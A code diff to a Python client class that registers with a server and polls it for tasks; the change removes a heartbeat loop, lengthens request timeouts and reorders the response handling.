@@ -14,19 +14,10 @@ class Client:
             self.local_ip = subprocess.run("hostname -I | awk '{print $1}'", shell=True, capture_output=True, text=True).stdout.strip()
         else:
             self.local_ip = socket.gethostbyname(socket.gethostname())
-        
-    def heartbeat(self):
-        while True:
-            try:
-                data = {'ip': self.local_ip,}
-                req = requests.post(f"http://{self.server_ip}:{self.port}/heartbeat", json=data, timeout=3)
-            except:
-                pass
-            time.sleep(120)
 
     def register(self):
         data = {'agent_id': self.local_ip}
-        req = requests.post(f"http://{self.server_ip}:{self.port}/register", json=data, timeout=3)
+        req = requests.post(f"http://{self.server_ip}:{self.port}/register", json=data, timeout=10)
         assert req.status_code == 201 or req.status_code == 200
 
     def handle_task(self,task_json):
@@ -62,7 +53,7 @@ class Client:
             self.run()
         while True:
             try:
-                req = requests.post(f"http://{self.server_ip}:{self.port}/tasks", json={'agent_id': self.local_ip}, timeout=3)
+                req = requests.post(f"http://{self.server_ip}:{self.port}/tasks", json={'agent_id': self.local_ip}, timeout=10)
                 if req.status_code == 418:
                     self.register()
                     continue
@@ -72,12 +63,10 @@ class Client:
                     #print("No tasks")
                     time.sleep(120)
                     continue
-                tasks = req.json()
-                if req.status_code not in [200, 201]:
-                    raise ValueError("Failed to get tasks")
                 if req.text == "NULL":
                     time.sleep(120)
                     continue
+                tasks = req.json()
                 self.handle_task(tasks)
             except Exception as e:
                 time.sleep(120)
